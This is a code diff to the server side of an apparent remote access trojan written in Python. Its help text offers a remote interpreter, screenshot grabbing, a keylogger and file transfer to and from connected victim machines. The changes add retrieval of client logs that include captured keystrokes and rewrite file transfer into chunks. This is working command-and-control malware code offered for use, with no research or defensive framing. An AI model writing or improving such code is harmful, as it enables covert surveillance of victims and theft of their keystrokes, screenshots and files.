@@ -33,7 +33,8 @@ interface_help = """--h | See this Help Message
 --i | Open Remote Python Interpreter
 --g | Grabs a screenshot
 --u | User Info
---k (start) (stop) (dump) | Manage Keylogger
+--k (start) (stop) | Manage Keylogger
+--l | Returns log from client (includes keylogs)
 --s | Transfers file to Client
 --r | Transfers file to Server
 --d | Download file from the web
@@ -50,6 +51,16 @@ turtle_help = """--h | See this Help Message
 --a | Broadcast command to all connected clients
 --l | List connected Clients
 --i (ID) | Connect to a Client"""
+
+
+def read_file(path, block_size=1024): 
+    with open(path, 'rb') as f: 
+        while True: 
+            piece = f.read(block_size) 
+            if piece: 
+                yield piece 
+            else: 
+                return
 
 
 def Hasher(MESSAGE):
@@ -277,7 +288,7 @@ class MultiServer(object):
         results = ''
         for i, conn in enumerate(self.all_connections):
             try:
-                self.send(conn, json_dumps(['--l']))
+                self.send(conn, json_dumps(['LIST']))
                 conn.recv(20480)
             except:
                 del self.all_connections[i]
@@ -312,11 +323,15 @@ class MultiServer(object):
         """ Send file from Server to Client """
         file_to_transfer = input('File to Transfer to Client: ')
         save_as = input('Save as: ')
-        with open(file_to_transfer, 'rb') as f:
-            content = f.read()
+
         self.send(conn, json_dumps(['--s', save_as]))
         self.receive(conn, _print=False)
-        self.send(conn, content)
+        print('Transferring file...')
+        for line in read_file(file_to_transfer):
+            self.send(conn, line)
+            self.receive(conn, _print=False)
+
+        self.send(conn, b'<FILE TRANSFER DONE>')
         self.receive(conn)
 
     def receive_file(self, conn):
@@ -326,14 +341,16 @@ class MultiServer(object):
         save_as = input('Save as: ')
 
         self.send(conn, json_dumps(['--r', file_to_transfer]))
-        content = self.receive(conn, _print=False)
-        if content == b'<TRANSFERERROR>':
-            print('Error Transfering File')
-            return
+        print('Transferring file...')
         with open(save_as, 'wb') as f:
-            f.write(content)
-        print('File Transfer Successful')
-        return
+            while 1:
+                data = self.receive(conn, _print=False)
+                if data == b'<FILE TRANSFER DONE>':
+                    self.send(conn, b'<RECEIVED>')
+                    break
+                f.write(data)
+                self.send(conn, b'<RECEIVED>')
+        self.receive(conn)
 
     def screenshot(self, conn):
         """ Take screenshot on Client """
@@ -453,6 +470,13 @@ class MultiServer(object):
             print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
             self.receive(conn)
             return
+        if '--l' in command:
+            self.send(conn, json_dumps(['--l']))
+            data = self.receive(conn, _print=False)
+            with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
+                f.write(data)
+            print('Log saved.')
+            return
         if command[:3] == '--k':
             if command[4:].strip() == 'start':
                 self.send(conn, json_dumps(['--k start']))
@@ -461,16 +485,6 @@ class MultiServer(object):
             if command[4:].strip() == 'stop':
                 self.send(conn, json_dumps(['--k stop']))
                 self.receive(conn)
-                return
-            if command[4:].strip() == 'dump':
-                self.send(conn, json_dumps(['--k dump']))
-                data = self.receive(conn, _print=False)
-                if data == b'<NOTRUNNING>':
-                    print('Keylogger not running\n')
-                    return
-                with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
-                    f.write(data)
-                print('Logs saved')
                 return
         if '--p' in command:
             self.send(conn, json_dumps(['--p']))
